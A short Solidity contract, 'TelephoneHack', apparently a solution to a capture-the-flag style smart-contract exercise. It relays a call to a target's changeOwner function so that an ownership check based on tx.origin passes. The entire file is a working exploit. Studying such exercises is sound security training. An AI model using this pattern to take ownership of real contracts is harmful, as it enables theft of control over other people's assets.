// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {

  Telephone telephoneContract;

  constructor(address _telephoneContractAddress) {
    telephoneContract = Telephone(_telephoneContractAddress);
  }

  function changeOwner(address _owner) public {
    telephoneContract.changeOwner(_owner);
  }
}
